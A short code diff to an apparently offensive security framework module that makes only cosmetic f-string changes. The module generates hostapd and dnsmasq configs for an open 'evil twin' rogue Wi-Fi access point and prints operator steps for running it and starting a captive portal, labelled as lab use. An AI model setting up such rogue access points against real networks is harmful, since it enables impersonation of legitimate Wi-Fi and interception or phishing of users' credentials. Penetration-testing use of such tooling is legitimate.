@@ -89,9 +89,9 @@ class Exploit(Exploit):
             [
                 "driver=nl80211",
                 "interface={}".format(self.ap_interface or "wlan0"),
-                "ssid={}".format(self.rogue_ssid),
+                f"ssid={self.rogue_ssid}",
                 "hw_mode=g",
-                "channel={}".format(int(self.channel)),
+                f"channel={int(self.channel)}",
                 "auth_algs=1",
                 "wmm_enabled=1",
                 "wpa=0",
@@ -112,8 +112,8 @@ class Exploit(Exploit):
         (out / "hostapd_evil_twin.conf").write_text(hostapd, encoding="utf-8")
         (out / "dnsmasq_evil_twin.conf").write_text(dnsmasq, encoding="utf-8")
 
-        print_success("Wrote runbook to {}".format(out))
-        print_status("1) Put {} in AP mode; assign IP 10.66.77.1/24 on AP iface.".format(self.ap_interface))
+        print_success(f"Wrote runbook to {out}")
+        print_status(f"1) Put {self.ap_interface} in AP mode; assign IP 10.66.77.1/24 on AP iface.")
         print_status("2) hostapd {}".format(out / "hostapd_evil_twin.conf"))
         print_status("3) dnsmasq --conf-file={} --no-daemon".format(out / "dnsmasq_evil_twin.conf"))
         print_status("4) Start captive portal: use generic/wifi/captive_portal_modern_lab on :80")
